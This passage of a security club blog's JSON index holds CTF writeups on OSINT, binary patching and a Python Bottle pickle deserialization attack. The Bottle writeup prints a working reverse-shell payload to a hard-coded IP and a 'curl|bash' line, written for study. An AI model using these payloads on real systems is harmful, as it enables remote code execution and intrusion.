Apocalypse 2023 - The Cursed Mission, Web Exploitation category.","tags":["ctf","writeup","web-exploitation","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Web Exploitation","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" ctf writeup osint idekctf-2022  Table of Contents  Introduction Finding the location Getting further informations Finding the deleted tweet Exploring the killer’s GitHub Conclusion    Introduction Given image: Get it here!\nDescription: I feel the killer might be dangerous so I have some info to give you but I don’t want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer.\nCategory: OSINT\nFinding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320.\nThen in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com.\nGetting further informations I then sent an email to the email above, and got the next instructions.\nFinding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James.\nThen from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science.\nI then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste this URL into the Wayback Machine: https://twitter.com/UThE_TS/status/1612383535549059076\nWe successfully gained access to the deleted tweet!\nExploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up:\nThe descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey.\nConcatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}.\nConclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps.\n","date":1673841054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673841054,"objectID":"52c028b7047c41e2b3988f4917b783fa","permalink":"https://blog.bkisc.com/blog/fazect/idekctf2022_osintcrime3/","publishdate":"2023-01-16T03:50:54Z","relpermalink":"/blog/fazect/idekctf2022_osintcrime3/","section":"blog","summary":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3.","tags":["ctf","writeup","osint","idekctf-2022"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" ctf writeup re isitdtu-2022  Table of Contents  Introduction Static Analysis Reaching case 14 Reaching case 1 Patch the binary Result    Introduction Given binary: Get it here!\nDescription: If you can make the program runs faster, you’ll get the flag!\nCategory: Reverse Engineering\nStatic Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code.\nAnalyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below.\nint __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh]  int v5[45]; // [esp+8h] [ebp-B8h] BYREF  v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it.\nint __cdecl sub_4013B0(_DWORD *a1) { int result; // eax  int v2; // eax  int v3; // [esp+4h] [ebp-64h]  ... snip int v37; // [esp+64h] [ebp-4h]  int v38; // [esp+64h] [ebp-4h]  while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\u0026#34;RESULT: %d\\n\u0026#34;, v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } It is easy to observe that only case 1 and case 14 involve calling other functions.\nTo be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog.\nReaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow.\nint __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF  char Buffer; // [esp+110h] [ebp-124h] BYREF  _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF  char v5[32]; // [esp+210h] [ebp-24h] BYREF  qmemcpy(v5, \u0026#34;Áõ\u0026#34;, 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026amp;Buffer, \u0026#34;%d\u0026#34;, 55 * a1); sub_401160(v5, v2, 30, \u0026amp;Buffer, \u0026amp;v4[strlen(\u0026amp;Buffer)] - v4); return sub_401040(\u0026#34;flag is: %s\u0026#34;, (char)v2); } The function receives our modified variable Block, then uses it to produce our flag.\nReaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time.\nint __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h]  v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag.\nPatch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part.\nmov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF.\nUsing IDA Pro integrated settings, which can be found at Options \u0026gt; Generals \u0026gt; Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode.\nWith pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below.\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; print(asm(\u0026#39;add ecx, edx\u0026#39;)) print(asm(\u0026#39;mov eax, ecx\u0026#39;)) It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use IDA Pro’s integrated hex view to patch the binary.\nChange E8 77 FC FF FF to 01 D1 89 C8 90 using any hex editor of …","date":1673624694,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673624694,"objectID":"40a209ad7f2b9aede0004e8de94746bc","permalink":"https://blog.bkisc.com/blog/fazect/isitdtu-2022-slow/","publishdate":"2023-01-13T16:17:00Z","relpermalink":"/blog/fazect/isitdtu-2022-slow/","section":"blog","summary":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow.","tags":["ctf","writeup","re","isitdtu-2022"],"title":"ISITDTU CTF 2022 Finals - Slow","type":"blog"},{"authors":["hdthinh1012"],"categories":null,"content":" ctf writeup web-exploitation  Table of Contents  Problem statement Basic  Python Bottle Pickle exploit   The exercise step  Generate cookie   Reference Links    Problem statement    Author hints that flag is executable\n     The website is vulnerable to directory traversal   Pick /etc/self/procline to get the start application command     So the application source is located at /app/app.py     from bottle import route, run, template, request, response, error from config.secret import sekai import os import re @route(\u0026#34;/\u0026#34;) def home(): return template(\u0026#34;index\u0026#34;) @route(\u0026#34;/show\u0026#34;) def index(): response.content_type = \u0026#34;text/plain; charset=UTF-8\u0026#34; param = request.query.id if re.search(\u0026#34;^../app\u0026#34;, param): return \u0026#34;No!!!!\u0026#34; requested_path = os.path.join(os.getcwd() + \u0026#34;/poems\u0026#34;, param) try: with open(requested_path) as f: tfile = f.read() except Exception as e: return \u0026#34;No This Poems\u0026#34; return tfile @error(404) def error404(error): return template(\u0026#34;error\u0026#34;) @route(\u0026#34;/sign\u0026#34;) def index(): try: session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) if not session or session[\u0026#34;name\u0026#34;] == \u0026#34;guest\u0026#34;: session = {\u0026#34;name\u0026#34;: \u0026#34;guest\u0026#34;} response.set_cookie(\u0026#34;name\u0026#34;, session, secret=sekai) return template(\u0026#34;guest\u0026#34;, name=session[\u0026#34;name\u0026#34;]) if session[\u0026#34;name\u0026#34;] == \u0026#34;admin\u0026#34;: return template(\u0026#34;admin\u0026#34;, name=session[\u0026#34;name\u0026#34;]) except: return \u0026#34;pls no hax\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: os.chdir(os.path.dirname(__file__)) run(host=\u0026#34;0.0.0.0\u0026#34;, port=8080) If run the code at local change the set_cookie’s session argument to {”name”:”admin”} will get the admin page but it just a trap\nThe hint said flag is executable, meaning RCE is possible.\nBasic Let’s have a look at Python Bottle\nPython Bottle    Bottle signed cookie    Bottle first:\n pickle.dumps([name, value], -1) then base64 encode → encoded hmac encrypt the secret seperately then base64 encode → signature add ‘!’ at the first char and ‘?’ in between signature  Cookie format: !secret_hmac_base64==?pickle_name_value_base64==\nBottle verify cookie    get_cookie:\n … base64 decode the pickled then call pickle.loads(pickle.dumps([’name’, “Pickle dumps containing RCE here”], -1))  We have controlled the value input through cookie\nPickle exploit Ref Byte-stream created by pickle.dumps contains opcodes that are then one-by-one executed as soon as we load the pickle back in. If you are curious how the instructions in this pickle look like, you can use pickletools to create a disassembly: pickletools.dis(pickled)\n\u0026gt;\u0026gt;\u0026gt; pickled = pickle.dumps([\u0026#39;pickle\u0026#39;, \u0026#39;me\u0026#39;, 1, 2, 3]) \u0026gt;\u0026gt;\u0026gt; import pickletools \u0026gt;\u0026gt;\u0026gt; pickletools.dis(pickled) 0: \\x80 PROTO 4 2: \\x95 FRAME 25 11: ] EMPTY_LIST 12: \\x94 MEMOIZE (as 0) 13: ( MARK 14: \\x8c SHORT_BINUNICODE \u0026#39;pickle\u0026#39; 22: \\x94 MEMOIZE (as 1) 23: \\x8c SHORT_BINUNICODE \u0026#39;me\u0026#39; 27: \\x94 MEMOIZE (as 2) 28: K BININT1 1 30: K BININT1 2 32: K BININT1 3 34: e APPENDS (MARK at 13) 35: . STOP pickle still allows you to define a custom behavior for the pickling process for your class instances.\nThe __reduce__() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”). […] When a tuple is returned, it must be between two and six items long. Optional items can either be omitted, or None can be provided as their value. The semantics of each item are in order: A callable object that will be called to create the initial version of the object. A tuple of arguments for the callable object. An empty tuple must be given if the callable does not accept any argument. […] So by implementing __reduce__ in a class which instances we are going to pickle, we can give the pickling process a callable plus some arguments to run. While intended for reconstructing objects, we can abuse this for getting our own reverse shell code executed.\nSo if any value in the array pass into pickle.dumps is an instance containing __reduce__(…) function, that reduce will be executed when calling pickle.loads(…). And the __reduce__(…) implement demand returns an tuple with first value an executable, callable method in python for example (os.system, eval or any function), the second value is argument of the callable.\nSo by implement reduce method that return (eval, (\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;curl xxx|bash\u0026#34;)\u0026#39;,)) , we can execute code on the server.\nThe exercise step Generate cookie Add an class definition with __reduce__ method (that return reverse shell python code) to create an instance, then pass the instance to the session1[’name’] that passed into set_cookie.\nclass RCE: def __reduce__(self): # 14.186.174.164 cmd = (\u0026#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 14.186.174.164 55555 \u0026gt; /tmp/f\u0026#39;) return os.system, ((f\u0026#34;\u0026#34;\u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;14.186.174.164\u0026#34;,55555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34;),) # Test @route(\u0026#34;/sign\u0026#34;) def index(): session = request.get_cookie(\u0026#34;name\u0026#34;, secret=sekai) print(session[\u0026#34;name\u0026#34;]) if not …","date":1673481600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1673481600,"objectID":"2256b16fb9515e2dc5aa0a85914de4e5","permalink":"https://blog.bkisc.com/blog/duti/sekai-ctf-2022-bottle-poem/","publishdate":"2023-01-12T00:00:00Z","relpermalink":"/blog/duti/sekai-ctf-2022-bottle-poem/","section":"blog","summary":"Deserialization attack with Python Bottle.","tags":["ctf","writeup","web-exploitation"],"title":"Sekai CTF 2022 Bottle Poem","type":"blog"},{"authors":[],"categories":null,"content":"","date":1666893600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1666893600,"objectID":"8e723f582259e44e14817f259e85b85a","permalink":"https://blog.bkisc.com/event/2022-10-27-hieupc-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-10-27-hieupc-talk/","section":"event","summary":"Anh Ngô Minh Hiếu, hiện là chuyên viên kỹ thuật tại Trung tâm Giám sát và An toàn không gian mạng Quốc gia (NCSC), sẽ có những chia sẻ về kinh nghiệm của bản thân trong việc ngăn chặn các thông tin lừa đảo, giả mạo, không chính thống. Qua đó, anh sẽ đưa ra những bài học, những dấu hiệu cơ bản của một thông tin giả mạo để người dùng có thể tránh khỏi những thông tin như vậy.","tags":[],"title":"Techtalk Event: Nhận thức về An toàn thông tin","type":"event"},{"authors":null,"categories":null,"content":"On October 15th, 2022, BKISC had a total of three teams participating in the ASCIS 2022 preliminary round, in the VN2 category, and achieved two honorable mentions: COPIUM team (ranked 17th) and BKISC team (ranked 9th). Congratulations to BKISC for advancing to the ASCIS 2022 final round, which will take place on November 13th, 2022..\n","date":1665792e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1665792e3,"objectID":"82f801a5177723be720227045096d73b","permalink":"https://blog.bkisc.com/post/22-10-25-ascis-2022-qualifier/","publishdate":"2022-10-15T00:00:00Z","relpermalink":"/post/22-10-25-ascis-2022-qualifier/","section":"post","summary":"On October 15th, 2022, BKISC had a total of three teams participating in the ASCIS 2022 preliminary round, in the VN2 category, and achieved two honorable mentions: COPIUM team (ranked 17th) and BKISC team (ranked 9th).","tags":null,"title":"BKISC participated in ASCIS 2022 Qualifier","type":"post"},{"authors":[],"categories":null,"content":"","date":1662400800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662400800,"objectID":"b5eaca94b40ea8028a014bf4da285bb5","permalink":"https://blog.bkisc.com/event/2022-09-05-thaidn-talk/","publishdate":"2017-01-01T00:00:00Z","relpermalink":"/event/2022-09-05-thaidn-talk/","section":"event","summary":"Anh Dương Ngọc Thái, hiện đang làm việc tại Google và thường được biết đến thông qua blog cá nhân vnhacker@blogspot, sẽ kể về những lần tham gia kiểm thử và tấn công hệ thống của một số bệnh viện và ngân hàng ở Việt Nam. Qua đó, anh nói lên tầm quan trọng của kiểm thử bảo mật phần mềm và chính sách breach notification nhằm nâng cao nhận thức về bảo vệ thông tin người dùng của doanh nghiệp.","tags":[],"title":"Grokking Techtalk 46: Những bài học về xâm nhập và bảo vệ hệ thống mạng Việt Nam","type":"event"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"6d99026b9e19e4fa43d5aadf147c7176","permalink":"https://blog.bkisc.com/contact/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/contact/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"62f29b617f905dd761b82d25a24bf276","permalink":"https://blog.bkisc.com/members/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/members/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"8e3aab287e330ba4efa5040ba790d4eb","permalink":"https://blog.bkisc.com/introduction/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/introduction/","section":"","summary":"","tags":null,"title":"Introduction","type":"widget_page"}]